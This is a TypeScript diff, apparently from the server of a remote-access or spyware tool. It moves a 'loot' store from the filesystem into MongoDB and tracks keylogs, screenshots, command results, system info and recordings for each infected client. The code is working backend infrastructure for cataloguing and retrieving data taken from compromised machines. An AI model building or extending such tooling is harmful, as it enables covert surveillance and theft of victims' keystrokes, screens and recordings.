@@ -1,83 +1,78 @@
-import fs from 'fs'
-import path from 'path'
-
-const LOOT_DIR = path.join(process.cwd(), 'loot')
+import { getDatabase } from './db'
 
 export interface LootFile {
+  id: string
   name: string
   path: string
   size: number
   type: string
   mtime: string
-  isDirectory: boolean
+  client_id: string
 }
 
-export function listLoot(subDir: string = ''): LootFile[] {
-  const fullPath = path.join(LOOT_DIR, subDir)
-  
-  if (!fs.existsSync(fullPath)) {
-    return []
-  }
+export async function listLoot(client_id?: string, type?: string): Promise<LootFile[]> {
+  const db = await getDatabase()
+  const filter: any = {}
+  if (client_id) filter.client_id = client_id
+  if (type) filter.type = type
 
-  const entries = fs.readdirSync(fullPath, { withFileTypes: true })
+  const rows = await db.collection('loot').find(filter).sort({ timestamp: -1 }).toArray() as any[]
   
-  return entries.map(entry => {
-    const entryPath = path.join(fullPath, entry.name)
-    const stats = fs.statSync(entryPath)
+  return rows.map(row => ({
+    id: row._id.toString(),
+    name: row.filename,
+    path: row.path || row.filename,
+    size: row.size || 0,
+    type: row.type || 'misc',
+    mtime: row.timestamp,
+    client_id: row.client_id
+  }))
+}
+
+export async function getLootContent(id: string): Promise<Buffer | null> {
+  const db = await getDatabase()
+  const { ObjectId } = require('mongodb')
+  
+  try {
+    const row = await db.collection('loot').findOne({ _id: new ObjectId(id) }) as any
+    if (!row || !row.data) return null
     
-    return {
-      name: entry.name,
-      path: path.relative(LOOT_DIR, entryPath).replace(/\\/g, '/'),
-      size: stats.size,
-      type: entry.isDirectory() ? 'directory' : path.extname(entry.name).slice(1),
-      mtime: stats.mtime.toISOString(),
-      isDirectory: entry.isDirectory()
-    }
-  })
+    // row.data is a Binary in MongoDB, which converts to Buffer in Node
+    return row.data.buffer || row.data
+  } catch (e) {
+    console.error('Error fetching loot data:', e)
+    return null
+  }
 }
 
-export function getLootContent(filePath: string): string | Buffer | null {
-  const fullPath = path.join(LOOT_DIR, filePath)
+export async function getLootStats() {
+  const db = await getDatabase()
   
-  // Security check: ensure path is within LOOT_DIR
-  const normalizedPath = path.normalize(fullPath)
-  if (!normalizedPath.startsWith(LOOT_DIR)) {
-    return null
-  }
-
-  if (!fs.existsSync(fullPath) || fs.statSync(fullPath).isDirectory()) {
-    return null
-  }
-
-  return fs.readFileSync(fullPath)
-}
-
-export function getLootStats() {
-  const getDirSize = (dir: string): number => {
-    const files = fs.readdirSync(dir)
-    return files.reduce((acc, file) => {
-      const filePath = path.join(dir, file)
-      const stats = fs.statSync(filePath)
-      if (stats.isDirectory()) {
-        return acc + getDirSize(filePath)
+  const pipeline = [
+    {
+      $group: {
+        _id: "$type",
+        count: { $sum: 1 },
+        size: { $sum: { $ifNull: ["$size", 0] } }
       }
-      return acc + stats.size
-    }, 0)
+    }
+  ]
+  
+  const results = await db.collection('loot').aggregate(pipeline).toArray()
+  const stats: Record<string, { count: number, size: number }> = {
+    command_result: { count: 0, size: 0 },
+    keylog: { count: 0, size: 0 },
+    screenshot: { count: 0, size: 0 },
+    system_info: { count: 0, size: 0 },
+    recordings: { count: 0, size: 0 }
   }
 
-  const categories = ['command_result', 'keylog', 'screenshot', 'system_info']
-  const stats: Record<string, { count: number, size: number }> = {}
-
-  categories.forEach(cat => {
-    const catPath = path.join(LOOT_DIR, cat)
-    if (fs.existsSync(catPath)) {
-      const files = fs.readdirSync(catPath)
-      stats[cat] = {
-        count: files.length,
-        size: getDirSize(catPath)
+  results.forEach(res => {
+    if (res._id) {
+      stats[res._id] = {
+        count: res.count,
+        size: res.size
       }
-    } else {
-      stats[cat] = { count: 0, size: 0 }
     }
   })
 
